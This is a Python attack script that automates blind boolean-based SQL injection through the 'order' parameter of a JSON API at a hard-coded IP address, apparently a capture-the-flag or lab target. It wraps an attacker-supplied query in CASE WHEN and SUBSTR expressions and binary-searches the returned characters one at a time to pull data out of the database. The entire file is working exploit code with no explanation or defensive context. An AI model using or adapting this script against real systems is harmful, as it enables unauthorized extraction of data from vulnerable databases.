#!/usr/bin/env python3

import hashlib
import sys
import requests
from urllib.parse import unquote
import decimal
import json
import signal

class colour:
   GREEN = '\033[1;32;48m'
   RED = '\033[0;31;48m'
   END = '\033[1;37;0m'

def signal_handler(sig, frame):
    print('\033[?25h', end = '\r')
    print('Injection canceled!')
    sys.exit(0)

def makeRequest(p):
    url = 'http://138.68.168.137:32710/api/list'

    data = {
        'order': f'{p}'
    }
    json_data = json.dumps(data)

    headers = {
        'Content-Type': 'application/json'
    }

    r = requests.post(url, data=json_data, headers=headers)
    return json.loads(r.text)[0]['id']


def buildInjection(payload, index, value):
    return f"(CASE WHEN (SELECT unicode(SUBSTR(({payload}),{index},1))>{value}) THEN count ELSE id END) ASC"


## Because python3's rounding is fucking stupid. Bankers rounding my ass
def myRound(n):
    return int(decimal.Decimal(n).quantize(decimal.Decimal('1'), rounding=decimal.ROUND_HALF_UP))


def enumerateValue(p):
    i = 1
    result = '' # extracted value

    while result[-2:] != '  ':
        ASCII_low = 32 # lower bound of printable characters
        ASCII_high = 126 # upper bound of printable characters

        v = ASCII_low # current char to be checked, starting from lower bound
        c = ''

        while ASCII_low < ASCII_high - 1:        
            injection = buildInjection(p, i, v)
            resp = makeRequest(injection)

            if resp == 1:
                if i == 1 and v == 32: # First iteration does not find a printable char
                    print('No data returned from query. Either nothing to return or query is broken.')
                    return

                ASCII_high = v # char in db is lower than current char, move upper bound
                v = myRound(v - (v - ASCII_low) / 2) # change current char to mid-point of lower bound and new upper bound
            else:
                ASCII_low = v # char in db is higher than current char, move lower bound
                v = myRound(v + (ASCII_high - v) / 2)# change current char to mid-point of new lower bound and upper bound

            c = chr(v) # get ascii of current char
            print(f'{colour.GREEN}{result}{colour.END}{colour.RED}{c}{colour.END}', end = '\r')

        i += 1
        result += c

    print()
    return result.rstrip()

signal.signal(signal.SIGINT, signal_handler)
order_inj = unquote(sys.argv[1])

print('\033[?25l', end = '\r') # Hide blinking cursor
enumerateValue(order_inj)
print('\033[?25h', end = '\r') # Bring blinking cursor back
